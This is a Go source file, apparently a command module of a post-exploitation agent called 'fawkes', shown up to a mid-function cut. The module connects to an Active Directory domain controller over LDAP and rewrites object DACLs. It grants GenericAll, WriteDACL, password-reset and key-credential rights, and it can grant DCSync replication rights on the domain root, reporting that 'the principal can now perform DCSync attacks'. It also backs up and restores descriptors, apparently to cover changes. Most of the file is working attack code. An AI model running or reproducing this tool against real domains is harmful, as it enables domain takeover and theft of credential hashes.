package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"github.com/go-ldap/ldap/v3"
	ber "github.com/go-asn1-ber/asn1-ber"
)

type AclEditCommand struct{}

func (c *AclEditCommand) Name() string        { return "acl-edit" }
func (c *AclEditCommand) Description() string { return "Read and modify Active Directory DACLs" }

type aclEditArgs struct {
	Action    string `json:"action"`
	Server    string `json:"server"`
	Port      int    `json:"port"`
	Username  string `json:"username"`
	Password  string `json:"password"`
	BaseDN    string `json:"base_dn"`
	UseTLS    bool   `json:"use_tls"`
	Target    string `json:"target"`
	Principal string `json:"principal"`
	Right     string `json:"right"`
	Backup    string `json:"backup"` // base64-encoded SD for restore
}

func (c *AclEditCommand) Execute(task structs.Task) structs.CommandResult {
	allActions := "read, add, remove, grant-dcsync, grant-genericall, grant-writedacl, backup, restore"
	if task.Params == "" {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: parameters required. Use -action <%s> -server <DC> -target <object>", allActions),
			Status:    "error",
			Completed: true,
		}
	}

	var args aclEditArgs
	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if args.Server == "" {
		return structs.CommandResult{
			Output:    "Error: server parameter required (domain controller IP or hostname)",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Target == "" && args.Action != "restore" {
		return structs.CommandResult{
			Output:    "Error: target parameter required",
			Status:    "error",
			Completed: true,
		}
	}

	if args.Port <= 0 {
		if args.UseTLS {
			args.Port = 636
		} else {
			args.Port = 389
		}
	}

	action := strings.ToLower(args.Action)
	validActions := map[string]bool{
		"read": true, "add": true, "remove": true,
		"grant-dcsync": true, "grant-genericall": true, "grant-writedacl": true,
		"backup": true, "restore": true,
	}
	if !validActions[action] {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s\nAvailable: %s", args.Action, allActions),
			Status:    "error",
			Completed: true,
		}
	}

	// Connect
	conn, err := ldapConnect(ldapQueryArgs{
		Server: args.Server, Port: args.Port, UseTLS: args.UseTLS,
		Username: args.Username, Password: args.Password,
	})
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error connecting to LDAP server %s:%d: %v", args.Server, args.Port, err),
			Status:    "error",
			Completed: true,
		}
	}
	defer conn.Close()

	// Bind
	if err := ldapBind(conn, ldapQueryArgs{Username: args.Username, Password: args.Password}); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error binding to LDAP: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Determine base DN
	baseDN := args.BaseDN
	if baseDN == "" {
		baseDN, err = detectBaseDN(conn)
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error detecting base DN: %v. Specify -base_dn manually.", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	switch action {
	case "read":
		return aclEditRead(conn, args, baseDN)
	case "add":
		return aclEditAdd(conn, args, baseDN)
	case "remove":
		return aclEditRemove(conn, args, baseDN)
	case "grant-dcsync":
		return aclEditGrantDCSync(conn, args, baseDN)
	case "grant-genericall":
		return aclEditGrantGenericAll(conn, args, baseDN)
	case "grant-writedacl":
		return aclEditGrantWriteDACL(conn, args, baseDN)
	case "backup":
		return aclEditBackup(conn, args, baseDN)
	case "restore":
		return aclEditRestore(conn, args, baseDN)
	default:
		return structs.CommandResult{Output: "Unknown action", Status: "error", Completed: true}
	}
}

// aclEditReadSD reads the raw nTSecurityDescriptor, trying with SD_FLAGS control first,
// falling back to a plain read if the control is not supported.
func aclEditReadSD(conn *ldap.Conn, targetDN string) ([]byte, error) {
	// Try with LDAP_SERVER_SD_FLAGS_OID control for DACL only (0x04)
	sdFlagsControl := buildSDFlagsControl(0x04) // DACL_SECURITY_INFORMATION
	searchReq := ldap.NewSearchRequest(
		targetDN,
		ldap.ScopeBaseObject,
		ldap.NeverDerefAliases,
		1, 10, false,
		"(objectClass=*)",
		[]string{"nTSecurityDescriptor"},
		[]ldap.Control{sdFlagsControl},
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		// Fallback: try without the control (some DCs reject it)
		searchReq.Controls = nil
		result, err = conn.Search(searchReq)
		if err != nil {
			return nil, fmt.Errorf("querying nTSecurityDescriptor: %v", err)
		}
	}

	if len(result.Entries) == 0 {
		return nil, fmt.Errorf("object not found: %s", targetDN)
	}

	sd := result.Entries[0].GetRawAttributeValue("nTSecurityDescriptor")
	if len(sd) < 20 {
		return nil, fmt.Errorf("nTSecurityDescriptor too short (%d bytes). May need elevated privileges", len(sd))
	}

	return sd, nil
}

// buildSDFlagsControl creates LDAP_SERVER_SD_FLAGS_OID (1.2.840.113556.1.4.801)
// This control specifies which parts of the security descriptor to return/modify.
// flags: 0x01=Owner, 0x02=Group, 0x04=DACL, 0x08=SACL
func buildSDFlagsControl(flags uint32) *ldap.ControlString {
	// BER encode as SDFlagsRequestValue ::= SEQUENCE { Flags INTEGER }
	// Hardcode the encoding for small flag values (0-127) which fit in 1 byte
	if flags <= 127 {
		controlValue := string([]byte{0x30, 0x03, 0x02, 0x01, byte(flags)})
		return ldap.NewControlString("1.2.840.113556.1.4.801", true, controlValue)
	}
	// For larger values, use BER library
	seq := ber.Encode(ber.ClassUniversal, ber.TypeConstructed, ber.TagSequence, nil, "SDFlagsRequestValue")
	seq.AppendChild(ber.Encode(ber.ClassUniversal, ber.TypePrimitive, ber.TagInteger, int64(flags), "Flags"))
	controlValue := seq.Bytes()
	return ldap.NewControlString("1.2.840.113556.1.4.801", true, string(controlValue))
}

// aclEditRead reads and displays the DACL of an AD object
func aclEditRead(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
		}
	}

	sd, err := aclEditReadSD(conn, targetDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading security descriptor: %v", err), Status: "error", Completed: true,
		}
	}

	aces := daclParseSD(sd)
	sidCache := daclResolveSIDs(conn, aces, baseDN)

	// Parse owner
	ownerSID := ""
	ownerOff := int(binary.LittleEndian.Uint32(sd[4:8]))
	if ownerOff > 0 && ownerOff+8 <= len(sd) {
		ownerSID = adcsParseSID(sd[ownerOff:])
	}
	ownerName := sidCache[ownerSID]
	if ownerName == "" {
		ownerName = ownerSID
	}

	type aceOutput struct {
		Principal   string `json:"principal"`
		SID         string `json:"sid"`
		Type        string `json:"type"`
		Permissions string `json:"permissions"`
		Risk        string `json:"risk"`
	}
	type readOutput struct {
		Mode     string      `json:"mode"`
		Target   string      `json:"target"`
		Owner    string      `json:"owner"`
		ACECount int         `json:"ace_count"`
		ACEs     []aceOutput `json:"aces"`
	}

	out := readOutput{
		Mode:     "acl-edit-read",
		Target:   targetDN,
		Owner:    ownerName,
		ACECount: len(aces),
	}

	for _, ace := range aces {
		principal := sidCache[ace.sid]
		if principal == "" {
			principal = ace.sid
		}
		aceTypeName := "ACCESS_ALLOWED"
		if ace.aceType == 0x05 {
			aceTypeName = "ACCESS_ALLOWED_OBJECT"
		}
		out.ACEs = append(out.ACEs, aceOutput{
			Principal:   principal,
			SID:         ace.sid,
			Type:        aceTypeName,
			Permissions: daclDescribePermissions(ace.mask, ace.aceType, ace.objectGUID),
			Risk:        daclAssessRisk(ace.mask, ace.aceType, ace.sid, ace.objectGUID),
		})
	}

	data, _ := json.Marshal(out)
	return structs.CommandResult{Output: string(data), Status: "success", Completed: true}
}

// resolvePrincipalSID resolves a principal name to a binary SID via LDAP
func resolvePrincipalSID(conn *ldap.Conn, principal string, baseDN string) ([]byte, string, error) {
	// If it looks like a SID string, convert directly
	if strings.HasPrefix(principal, "S-1-") {
		sidBytes := daclSIDToBytes(principal)
		if sidBytes == nil {
			return nil, "", fmt.Errorf("invalid SID format: %s", principal)
		}
		return sidBytes, principal, nil
	}

	// Try resolving by sAMAccountName
	filter := fmt.Sprintf("(sAMAccountName=%s)", ldap.EscapeFilter(principal))
	searchReq := ldap.NewSearchRequest(
		baseDN,
		ldap.ScopeWholeSubtree,
		ldap.NeverDerefAliases,
		1, 10, false,
		filter,
		[]string{"objectSid", "sAMAccountName"},
		nil,
	)

	result, err := conn.Search(searchReq)
	if err != nil {
		return nil, "", fmt.Errorf("LDAP search error: %v", err)
	}

	if len(result.Entries) == 0 {
		// Try by CN
		filter = fmt.Sprintf("(cn=%s)", ldap.EscapeFilter(principal))
		searchReq.Filter = filter
		result, err = conn.Search(searchReq)
		if err != nil || len(result.Entries) == 0 {
			return nil, "", fmt.Errorf("principal not found: %s", principal)
		}
	}

	sidBytes := result.Entries[0].GetRawAttributeValue("objectSid")
	if len(sidBytes) < 8 {
		return nil, "", fmt.Errorf("invalid objectSid for %s", principal)
	}

	sidStr := adcsParseSID(sidBytes)
	return sidBytes, sidStr, nil
}

// rightToMaskAndGUID maps friendly right names to access mask and optional object GUID
func rightToMaskAndGUID(right string) (uint32, []byte, byte) {
	right = strings.ToLower(right)
	switch right {
	case "genericall", "full-control":
		return 0x10000000, nil, 0x00 // GenericAll
	case "genericwrite":
		return 0x40000000, nil, 0x00 // GenericWrite
	case "writedacl":
		return 0x00040000, nil, 0x00 // WriteDACL
	case "writeowner":
		return 0x00080000, nil, 0x00 // WriteOwner
	case "allextendedrights":
		return 0x00000100, nil, 0x00 // All Extended Rights
	case "writeproperty":
		return 0x00000020, nil, 0x00 // Write all properties
	case "forcechangepassword":
		// ExtendedRight with User-Force-Change-Password GUID
		return 0x00000100, aclGUIDBytes("00299570-246d-11d0-a768-00aa006e0529"), 0x05
	case "dcsync", "ds-replication-get-changes":
		return 0x00000100, aclGUIDBytes("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"), 0x05
	case "ds-replication-get-changes-all":
		return 0x00000100, aclGUIDBytes("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"), 0x05
	case "write-member":
		// WriteProperty on 'member' attribute
		return 0x00000020, aclGUIDBytes("bf9679c0-0de6-11d0-a285-00aa003049e2"), 0x05
	case "write-spn":
		return 0x00000020, aclGUIDBytes("bf967a86-0de6-11d0-a285-00aa003049e2"), 0x05
	case "write-keycredentiallink":
		return 0x00000020, aclGUIDBytes("5b47d60f-6090-40b2-9f37-2a4de88f3063"), 0x05
	default:
		return 0, nil, 0x00
	}
}

// aclGUIDBytes converts a GUID string "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx" to
// mixed-endian binary format used by AD.
func aclGUIDBytes(guidStr string) []byte {
	// Remove hyphens
	clean := strings.ReplaceAll(guidStr, "-", "")
	if len(clean) != 32 {
		return nil
	}

	guid := make([]byte, 16)
	// Data1 (4 bytes, little-endian)
	for i := 0; i < 4; i++ {
		b := hexByte(clean[(3-i)*2 : (3-i)*2+2])
		guid[i] = b
	}
	// Data2 (2 bytes, little-endian)
	for i := 0; i < 2; i++ {
		b := hexByte(clean[8+(1-i)*2 : 8+(1-i)*2+2])
		guid[4+i] = b
	}
	// Data3 (2 bytes, little-endian)
	for i := 0; i < 2; i++ {
		b := hexByte(clean[12+(1-i)*2 : 12+(1-i)*2+2])
		guid[6+i] = b
	}
	// Data4 (8 bytes, big-endian)
	for i := 0; i < 8; i++ {
		guid[8+i] = hexByte(clean[16+i*2 : 16+i*2+2])
	}

	return guid
}

func hexByte(s string) byte {
	var b byte
	for _, c := range s {
		b <<= 4
		switch {
		case c >= '0' && c <= '9':
			b |= byte(c - '0')
		case c >= 'a' && c <= 'f':
			b |= byte(c - 'a' + 10)
		case c >= 'A' && c <= 'F':
			b |= byte(c - 'A' + 10)
		}
	}
	return b
}

// buildACE constructs a binary ACE structure
func buildACE(aceType byte, mask uint32, sid []byte, objectGUID []byte) []byte {
	if aceType == 0x05 && len(objectGUID) == 16 {
		// ACCESS_ALLOWED_OBJECT_ACE_TYPE
		// Header(4) + Mask(4) + Flags(4) + ObjectType(16) + SID
		aceSize := 4 + 4 + 4 + 16 + len(sid)
		ace := make([]byte, aceSize)
		ace[0] = 0x05                                                         // AceType
		ace[1] = 0x00                                                         // AceFlags (no inheritance)
		binary.LittleEndian.PutUint16(ace[2:4], uint16(aceSize))              // AceSize
		binary.LittleEndian.PutUint32(ace[4:8], mask)                         // AccessMask
		binary.LittleEndian.PutUint32(ace[8:12], 0x01)                        // Flags: ACE_OBJECT_TYPE_PRESENT
		copy(ace[12:28], objectGUID)                                          // ObjectType GUID
		copy(ace[28:], sid)                                                   // SID
		return ace
	}

	// ACCESS_ALLOWED_ACE_TYPE (standard)
	aceSize := 4 + 4 + len(sid) // Header(4) + Mask(4) + SID
	ace := make([]byte, aceSize)
	ace[0] = 0x00                                            // AceType
	ace[1] = 0x00                                            // AceFlags
	binary.LittleEndian.PutUint16(ace[2:4], uint16(aceSize)) // AceSize
	binary.LittleEndian.PutUint32(ace[4:8], mask)            // AccessMask
	copy(ace[8:], sid)                                       // SID
	return ace
}

// aclEditModifySD reads the current SD, adds/removes an ACE, and writes the full modified SD back.
// Uses the complete original SD to preserve owner, group, and SACL — only the DACL is modified.
func aclEditModifySD(conn *ldap.Conn, targetDN string, principalSID []byte, principalSIDStr string, mask uint32, objectGUID []byte, aceType byte, remove bool) error {
	sd, err := aclEditReadSD(conn, targetDN)
	if err != nil {
		return err
	}

	// Parse DACL offset and existing ACL
	daclOffset := int(binary.LittleEndian.Uint32(sd[16:20]))
	if daclOffset == 0 || daclOffset >= len(sd) {
		return fmt.Errorf("no DACL present in security descriptor")
	}

	if daclOffset+8 > len(sd) {
		return fmt.Errorf("invalid DACL offset")
	}

	aclSize := int(binary.LittleEndian.Uint16(sd[daclOffset+2 : daclOffset+4]))
	aceCount := int(binary.LittleEndian.Uint16(sd[daclOffset+4 : daclOffset+6]))

	// Extract existing ACEs
	existingACEs := make([]byte, aclSize-8)
	if daclOffset+8+len(existingACEs) <= len(sd) {
		copy(existingACEs, sd[daclOffset+8:daclOffset+aclSize])
	}

	newACE := buildACE(aceType, mask, principalSID, objectGUID)

	var newACLBody []byte
	var newACECount int

	if remove {
		newACLBody, newACECount = removeMatchingACEs(existingACEs, aceCount, principalSIDStr, mask, objectGUID, aceType)
		if newACECount == aceCount {
			return fmt.Errorf("no matching ACE found to remove for SID %s with mask 0x%08x", principalSIDStr, mask)
		}
	} else {
		newACLBody = append(newACE, existingACEs...)
		newACECount = aceCount + 1
	}

	// Build new ACL
	newACLSize := 8 + len(newACLBody)
	newACL := make([]byte, newACLSize)
	newACL[0] = sd[daclOffset] // Preserve original ACL revision
	newACL[1] = 0
	binary.LittleEndian.PutUint16(newACL[2:4], uint16(newACLSize))
	binary.LittleEndian.PutUint16(newACL[4:6], uint16(newACECount))
	binary.LittleEndian.PutUint16(newACL[6:8], 0)
	copy(newACL[8:], newACLBody)

	// Rebuild the full SD: preserve everything before the DACL, replace DACL, preserve everything after
	// The SD is self-relative, so we need to adjust offsets if the DACL size changed
	oldACLEnd := daclOffset + aclSize
	sizeDelta := newACLSize - aclSize

	newSD := make([]byte, len(sd)+sizeDelta)
	// Copy everything before the DACL
	copy(newSD[:daclOffset], sd[:daclOffset])
	// Insert new DACL
	copy(newSD[daclOffset:], newACL)
	// Copy everything after the old DACL
	if oldACLEnd < len(sd) {
		copy(newSD[daclOffset+newACLSize:], sd[oldACLEnd:])
	}

	// Adjust offsets in the SD header for sections that come after the DACL
	ownerOff := int(binary.LittleEndian.Uint32(newSD[4:8]))
	groupOff := int(binary.LittleEndian.Uint32(newSD[8:12]))
	saclOff := int(binary.LittleEndian.Uint32(newSD[12:16]))

	if ownerOff > daclOffset {
		binary.LittleEndian.PutUint32(newSD[4:8], uint32(ownerOff+sizeDelta))
	}
	if groupOff > daclOffset {
		binary.LittleEndian.PutUint32(newSD[8:12], uint32(groupOff+sizeDelta))
	}
	if saclOff > daclOffset {
		binary.LittleEndian.PutUint32(newSD[12:16], uint32(saclOff+sizeDelta))
	}

	// Write the modified SD back, trying with SD_FLAGS control first for DACL-only modification,
	// falling back to writing the full SD without the control
	sdFlagsControl := buildSDFlagsControl(0x04) // DACL_SECURITY_INFORMATION

	// Try with SD_FLAGS control — tells AD to only modify the DACL
	modReq := ldap.NewModifyRequest(targetDN, []ldap.Control{sdFlagsControl})
	// When using SD_FLAGS, write a minimal SD with just the DACL
	minSD := make([]byte, 20+len(newACL))
	minSD[0] = 1                                                         // Revision
	binary.LittleEndian.PutUint16(minSD[2:4], 0x8004)                    // SE_DACL_PRESENT | SE_SELF_RELATIVE
	binary.LittleEndian.PutUint32(minSD[16:20], 20)                      // OffsetDacl
	copy(minSD[20:], newACL)
	modReq.Replace("nTSecurityDescriptor", []string{string(minSD)})

	err = conn.Modify(modReq)
	if err != nil {
		// Fallback: write the full modified SD without the control
		modReq = ldap.NewModifyRequest(targetDN, nil)
		modReq.Replace("nTSecurityDescriptor", []string{string(newSD)})
		err = conn.Modify(modReq)
	}

	return err
}

// removeMatchingACEs removes ACEs that match the given SID, mask, and objectGUID.
// Uses a two-pass approach: first tries exact mask match, then falls back to SID-based
// matching. AD often decomposes generic rights (e.g., GenericAll 0x10000000) into
// specific component rights, so exact mask matching may fail after a write.
func removeMatchingACEs(aceData []byte, aceCount int, targetSID string, targetMask uint32, targetGUID []byte, targetType byte) ([]byte, int) {
	// Pass 1: Try exact match (mask + SID + GUID)
	result, remaining := removeMatchingACEsPass(aceData, aceCount, targetSID, targetMask, targetGUID, targetType, true)
	if remaining < aceCount {
		return result, remaining
	}

	// Pass 2: Relaxed match — SID only for standard ACEs, SID + GUID for object ACEs.
	// This handles cases where AD decomposed GenericAll/GenericWrite into specific rights.
	return removeMatchingACEsPass(aceData, aceCount, targetSID, targetMask, targetGUID, targetType, false)
}

func removeMatchingACEsPass(aceData []byte, aceCount int, targetSID string, targetMask uint32, targetGUID []byte, targetType byte, exactMask bool) ([]byte, int) {
	var result []byte
	remaining := aceCount
	pos := 0

	for i := 0; i < aceCount && pos+4 <= len(aceData); i++ {
		aceType := aceData[pos]
		aceSize := int(binary.LittleEndian.Uint16(aceData[pos+2 : pos+4]))

		if aceSize < 4 || pos+aceSize > len(aceData) {
			break
		}

		shouldRemove := false

		switch aceType {
		case 0x00: // ACCESS_ALLOWED_ACE_TYPE
			if pos+8 <= len(aceData) && targetType == 0x00 && len(targetGUID) == 0 {
				sid := adcsParseSID(aceData[pos+8 : pos+aceSize])
				if sid == targetSID {
					if exactMask {
						mask := binary.LittleEndian.Uint32(aceData[pos+4 : pos+8])
						shouldRemove = (mask == targetMask)
					} else {
						// Relaxed: match by SID only — handles decomposed generic rights
						shouldRemove = true
					}
				}
			}
		case 0x05: // ACCESS_ALLOWED_OBJECT_ACE_TYPE
			if pos+12 <= len(aceData) && targetType == 0x05 {
				flags := binary.LittleEndian.Uint32(aceData[pos+8 : pos+12])

				sidStart := pos + 12
				var objGUID []byte
				if flags&0x01 != 0 && sidStart+16 <= len(aceData) {
					objGUID = aceData[sidStart : sidStart+16]
					sidStart += 16
				}
				if flags&0x02 != 0 {
					sidStart += 16
				}

				if sidStart < pos+aceSize {
					sid := adcsParseSID(aceData[sidStart : pos+aceSize])
					guidsMatch := len(targetGUID) == 16 && len(objGUID) == 16
					if guidsMatch {
						for j := 0; j < 16; j++ {
							if targetGUID[j] != objGUID[j] {
								guidsMatch = false
								break
							}
						}
					}
					if sid == targetSID && guidsMatch {
						if exactMask {
							mask := binary.LittleEndian.Uint32(aceData[pos+4 : pos+8])
							shouldRemove = (mask == targetMask)
						} else {
							shouldRemove = true
						}
					}
				}
			}
		}

		if !shouldRemove {
			result = append(result, aceData[pos:pos+aceSize]...)
		} else {
			remaining--
		}

		pos += aceSize
	}

	return result, remaining
}

// aclEditAdd adds an ACE granting the specified right to the principal
func aclEditAdd(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return structs.CommandResult{
			Output: "Error: principal parameter required (sAMAccountName or SID)", Status: "error", Completed: true,
		}
	}
	if args.Right == "" {
		return structs.CommandResult{
			Output: "Error: right parameter required (genericall, writedacl, writeowner, forcechangepassword, dcsync, etc.)", Status: "error", Completed: true,
		}
	}

	mask, objectGUID, aceType := rightToMaskAndGUID(args.Right)
	if mask == 0 {
		return structs.CommandResult{
			Output: fmt.Sprintf("Unknown right: %s\nAvailable: genericall, genericwrite, writedacl, writeowner, allextendedrights, writeproperty, forcechangepassword, dcsync, ds-replication-get-changes-all, write-member, write-spn, write-keycredentiallink", args.Right),
			Status: "error", Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
		}
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
		}
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, mask, objectGUID, aceType, false); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error modifying DACL: %v", err), Status: "error", Completed: true,
		}
	}

	rightDesc := args.Right
	if aceType == 0x05 && len(objectGUID) == 16 {
		rightDesc = fmt.Sprintf("%s (%s)", args.Right, daclGUIDName(objectGUID))
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] ACL Modified\n"+
			"[+] Target: %s\n"+
			"[+] Principal: %s (%s)\n"+
			"[+] Right Added: %s\n"+
			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, rightDesc, args.Server),
		Status: "success", Completed: true,
	}
}

// aclEditRemove removes a matching ACE from the DACL
func aclEditRemove(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" || args.Right == "" {
		return structs.CommandResult{
			Output: "Error: principal and right parameters required", Status: "error", Completed: true,
		}
	}

	mask, objectGUID, aceType := rightToMaskAndGUID(args.Right)
	if mask == 0 {
		return structs.CommandResult{
			Output: fmt.Sprintf("Unknown right: %s", args.Right), Status: "error", Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
		}
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
		}
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, mask, objectGUID, aceType, true); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error modifying DACL: %v", err), Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] ACL Modified\n"+
			"[+] Target: %s\n"+
			"[+] Principal: %s (%s)\n"+
			"[+] Right Removed: %s\n"+
			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Right, args.Server),
		Status: "success", Completed: true,
	}
}

// aclEditGrantDCSync adds both DS-Replication-Get-Changes and DS-Replication-Get-Changes-All
func aclEditGrantDCSync(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return structs.CommandResult{
			Output: "Error: principal parameter required", Status: "error", Completed: true,
		}
	}

	// DCSync needs to be applied to the domain root, not an arbitrary object
	targetDN := baseDN

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
		}
	}

	// Add DS-Replication-Get-Changes
	guid1 := aclGUIDBytes("1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")
	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00000100, guid1, 0x05, false); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error adding DS-Replication-Get-Changes: %v", err), Status: "error", Completed: true,
		}
	}

	// Add DS-Replication-Get-Changes-All
	guid2 := aclGUIDBytes("1131f6ad-9c07-11d1-f79f-00c04fc2dcd2")
	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00000100, guid2, 0x05, false); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error adding DS-Replication-Get-Changes-All: %v", err), Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] DCSync Rights Granted\n"+
			"[+] Target: %s (domain root)\n"+
			"[+] Principal: %s (%s)\n"+
			"[+] Added: DS-Replication-Get-Changes\n"+
			"[+] Added: DS-Replication-Get-Changes-All\n"+
			"[+] Server: %s\n"+
			"[!] The principal can now perform DCSync attacks\n", targetDN, args.Principal, principalSIDStr, args.Server),
		Status: "success", Completed: true,
	}
}

// aclEditGrantGenericAll adds GenericAll to the principal on the target
func aclEditGrantGenericAll(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return structs.CommandResult{
			Output: "Error: principal parameter required", Status: "error", Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
		}
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
		}
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x10000000, nil, 0x00, false); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error adding GenericAll: %v", err), Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] GenericAll Granted\n"+
			"[+] Target: %s\n"+
			"[+] Principal: %s (%s)\n"+
			"[+] Right: GenericAll (FULL CONTROL)\n"+
			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server),
		Status: "success", Completed: true,
	}
}

// aclEditGrantWriteDACL adds WriteDACL to the principal on the target
func aclEditGrantWriteDACL(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Principal == "" {
		return structs.CommandResult{
			Output: "Error: principal parameter required", Status: "error", Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
		}
	}

	principalSID, principalSIDStr, err := resolvePrincipalSID(conn, args.Principal, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving principal '%s': %v", args.Principal, err), Status: "error", Completed: true,
		}
	}

	if err := aclEditModifySD(conn, targetDN, principalSID, principalSIDStr, 0x00040000, nil, 0x00, false); err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error adding WriteDACL: %v", err), Status: "error", Completed: true,
		}
	}

	return structs.CommandResult{
		Output: fmt.Sprintf("[*] WriteDACL Granted\n"+
			"[+] Target: %s\n"+
			"[+] Principal: %s (%s)\n"+
			"[+] Right: WriteDACL\n"+
			"[+] Server: %s\n", targetDN, args.Principal, principalSIDStr, args.Server),
		Status: "success", Completed: true,
	}
}

// aclEditBackup exports the current DACL as base64 for later restoration
func aclEditBackup(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
		}
	}

	sd, err := aclEditReadSD(conn, targetDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error reading security descriptor: %v", err), Status: "error", Completed: true,
		}
	}

	encoded := base64.StdEncoding.EncodeToString(sd)

	type backupOutput struct {
		Mode   string `json:"mode"`
		Target string `json:"target"`
		Backup string `json:"backup"`
	}

	out := backupOutput{
		Mode:   "acl-edit-backup",
		Target: targetDN,
		Backup: encoded,
	}

	data, _ := json.Marshal(out)
	return structs.CommandResult{Output: string(data), Status: "success", Completed: true}
}

// aclEditRestore writes a previously backed-up DACL back to the object
func aclEditRestore(conn *ldap.Conn, args aclEditArgs, baseDN string) structs.CommandResult {
	if args.Backup == "" {
		return structs.CommandResult{
			Output: "Error: backup parameter required (base64-encoded security descriptor from backup action)", Status: "error", Completed: true,
		}
	}

	targetDN, err := ldapResolveDN(conn, args.Target, baseDN)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error resolving target '%s': %v", args.Target, err), Status: "error", Completed: true,
		}
	}

	sd, err := base64.StdEncoding.DecodeString(args.Backup)
	if err != nil {
		return structs.CommandResult{
			Output: fmt.Sprintf("Error decoding backup: %v", err), Status: "error", Completed: true,
		}
	}

	if len(sd) < 20 {
		return structs.CommandResult{
			Output: "Error: invalid security descriptor (too short)", Status: "error", Completed: true,
		}
	}

	// Try with SD_FLAGS control first, fallback to without
	sdFlagsControl := buildSDFlagsControl(0x04)
	modReq := ldap.NewModifyRequest(targetDN, []ldap.Control{sdFlagsControl})
	modReq.Replace("nTSecurityDescriptor", []string{string(sd)})

	err = conn.Modify(modReq)
	if err != nil {
		modReq = ldap.NewModifyRequest(targetDN, nil)
		modReq.Replace("nTSecurityDescriptor", []string{string(sd)})
		err = conn.Modify(modReq)
	}

	if err != nil {
